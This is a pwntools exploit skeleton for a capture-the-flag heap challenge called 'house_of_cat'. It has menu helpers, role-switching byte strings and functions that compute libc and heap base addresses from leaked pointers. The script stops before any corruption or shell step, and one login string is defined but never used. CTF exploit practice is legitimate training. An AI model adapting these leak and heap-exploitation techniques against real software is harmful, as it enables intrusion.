from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
#context.terminal = ['tmux','splitw','-hp',"60"]

p = process("./house_of_cat")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

recvuntil = lambda x : p.recvuntil(x)
send = lambda x : p.send(x)
sendline = lambda x : p.sendline(x)


def command(choice):
	recvuntil("Choice: ")
	sendline(str(choice))

def add(size,message):
	command(1)
	p.recvuntil("size: ")
	sendline(str(size))
	p.recvuntil("message: ")
	send(message)

def free(index):
	command(4)
	recvuntil('index: ')
	sendline(str(index))

def edit(index,message):
	command(3)
	recvuntil('index: ')
	sendline(str(index))
	recvuntil("message: ")
	send(message)
	
def show(index):
	command(2)
	recvuntil('index: ')
	sendline(str(index))
	
def change(role):
	command(5)
	if (role == 1):
		recvuntil('user:\n')
		sendline("A\x01\x95\xc9\x1c")
	if (role == 2):
		recvuntil('user:\n')
		sendline("B\x01\x87\xc3\x19")
	if (role == 3):
		recvuntil('user:\n')
		sendline("C\x01\xf7\x3c\x32")

def libc_addr():
	p.recvuntil("message is: ")
	libc_base = u64(p.recv(6).ljust(8,b'\x00')) - (0x7f57c0d2abe0-0x7f57c0b3e000)
	success("libc_base: "+hex(libc_base))
	return libc_base
def heap_addr():
	p.recvuntil("message is: ")
	heap_base = u64(p.recv(6).ljust(8,b'\x00')) - (0x55a9c79538b0-0x55a9c7941000)
	success("heap_base: "+hex(heap_base))
	return heap_base

recvuntil("mew~~~~~\n")
login_1 = "LOGIN | r00t QWB QWXF admin\x00"

p.interactive()
